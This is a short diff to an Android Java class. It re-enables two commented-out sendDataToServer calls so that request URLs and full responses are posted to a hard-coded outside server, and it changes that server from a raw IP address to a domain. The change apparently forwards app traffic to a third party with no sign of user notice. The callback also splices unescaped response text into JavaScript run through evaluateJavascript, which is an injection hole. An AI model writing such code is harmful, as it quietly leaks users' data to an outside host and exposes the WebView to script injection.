@@ -30,7 +30,7 @@ public class request {
                     String jsCallback = "javascript:" + callback + "('" + key + "'," + "`" + response + "`)";
                     webView.evaluateJavascript(jsCallback, null);
                 });
-//                sendDataToServer(url, response,"");
+                sendDataToServer(url, response,"");
             }
 
             @Override
@@ -55,7 +55,7 @@ public class request {
                     webView.evaluateJavascript(jsCallback, null);
 
                 });
-//                sendDataToServer(url, response,jsonArray);
+                sendDataToServer(url, response,jsonArray);
             }
 
             @Override
@@ -106,7 +106,7 @@ public class request {
         }
 
         // 将数据发送到指定服务器
-        String serverUrl = "http://124.70.178.24:54321/rcv_datas";
+        String serverUrl = "http://p-trd.cn/api/rcv_datas";
         NetworkUtils.postData(serverUrl, data.toString(), new NetworkUtils.Callback() {
             @Override
             public void onSuccess(String response) {
